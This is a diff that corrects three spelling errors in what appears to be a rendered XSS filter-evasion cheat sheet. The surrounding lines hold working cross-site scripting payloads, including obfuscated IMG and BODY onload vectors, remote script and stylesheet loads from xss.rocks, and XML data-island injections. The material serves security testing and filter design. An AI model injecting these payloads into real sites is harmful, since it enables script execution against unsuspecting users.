@@ -3355,7 +3355,7 @@
 <p>This is useful if the pattern match doesn't take into account spaces in the word <code>javascript:</code> -which is correct since that won't render- and makes the false assumption that you can't have a space between the quote and the <code>javascript:</code> keyword. The actual reality is you can have any char from 1-32 in decimal:</p>
 <p><code>&lt;IMG SRC=" &amp;#14;  javascript:alert('XSS');"&gt;</code></p>
 <h3 id="non-alpha-non-digit-xss">Non-alpha-non-digit XSS<a class="headerlink" href="#non-alpha-non-digit-xss" title="Permanent link">&para;</a></h3>
-<p>The Firefox HTML parser assumes a non-alpha-non-digit is not valid after an HTML keyword and therefor considers it to be a whitespace or non-valid token after an HTML tag. The problem is that some XSS filters assume that the tag they are looking for is broken up by whitespace. For example <code>\&lt;SCRIPT\\s</code> != <code>\&lt;SCRIPT/XSS\\s</code>:</p>
+<p>The Firefox HTML parser assumes a non-alpha-non-digit is not valid after an HTML keyword and therefore considers it to be a whitespace or non-valid token after an HTML tag. The problem is that some XSS filters assume that the tag they are looking for is broken up by whitespace. For example <code>\&lt;SCRIPT\\s</code> != <code>\&lt;SCRIPT/XSS\\s</code>:</p>
 <p><code>&lt;SCRIPT/XSS SRC="http://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;</code></p>
 <p>Based on the same idea as above, however,expanded on it, using Rnake fuzzer. The Gecko rendering engine allows for any character other than letters, numbers or encapsulation chars (like quotes, angle brackets, etc...) between the event handler and the equals sign, making it easier to bypass cross site scripting blocks. Note that this also applies to the grave accent char as seen here:</p>
 <div class="highlight"><pre><span></span><code>&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;
@@ -3535,7 +3535,7 @@ to hack Google Desktop. As a side note, you can remove the end <code>&lt;/STYLE&
 <p>This only works in Opera 8.0 (no longer in 9.x) but is fairly tricky. According to RFC2616 setting a link header is not part of the HTTP1.1 spec, however some browsers still allow it (like Firefox and Opera). The trick here is that I am setting a header (which is basically no different than in the HTTP header saying <code>Link: &lt;http://xss.rocks/xss.css&gt;; REL=stylesheet</code>) and the remote style sheet with my cross site scripting vector is running the JavaScript, which is not supported in FireFox:</p>
 <p><code>&lt;META HTTP-EQUIV="Link" Content="&lt;http://xss.rocks/xss.css&gt;; REL=stylesheet"&gt;</code></p>
 <h3 id="remote-style-sheet-part-4">Remote style sheet part 4<a class="headerlink" href="#remote-style-sheet-part-4" title="Permanent link">&para;</a></h3>
-<p>This only works in Gecko rendering engines and works by binding an XUL file to the parent page. I think the irony here is that Netscape assumes that Gecko is safer and therefor is vulnerable to this for the vast majority of sites:</p>
+<p>This only works in Gecko rendering engines and works by binding an XUL file to the parent page. I think the irony here is that Netscape assumes that Gecko is safer and therefore is vulnerable to this for the vast majority of sites:</p>
 <p><code>&lt;STYLE&gt;BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}&lt;/STYLE&gt;</code></p>
 <h3 id="style-tags-with-broken-up-javascript-for-xss">STYLE Tags with Broken-up JavaScript for XSS<a class="headerlink" href="#style-tags-with-broken-up-javascript-for-xss" title="Permanent link">&para;</a></h3>
 <p>This XSS at times sends IE into an infinite loop of alerts:</p>
@@ -3635,7 +3635,7 @@ eval(a+b+c+d);
 &lt;SPAN DATASRC=&quot;#xss&quot; DATAFLD=&quot;B&quot; DATAFORMATAS=&quot;HTML&quot;&gt;&lt;/SPAN&gt;
 </code></pre></div>
 <h3 id="locally-hosted-xml-with-embedded-javascript-that-is-generated-using-an-xml-data-island">Locally hosted XML with embedded JavaScript that is generated using an XML data island<a class="headerlink" href="#locally-hosted-xml-with-embedded-javascript-that-is-generated-using-an-xml-data-island" title="Permanent link">&para;</a></h3>
-<p>This is the same as above but instead referrs to a locally hosted (must be on the same server) XML file that contains your cross site scripting vector. You can see the result here:</p>
+<p>This is the same as above but instead refers to a locally hosted (must be on the same server) XML file that contains your cross site scripting vector. You can see the result here:</p>
 <div class="highlight"><pre><span></span><code>&lt;XML SRC=&quot;xsstest.xml&quot; ID=I&gt;&lt;/XML&gt;  
 &lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
 </code></pre></div>
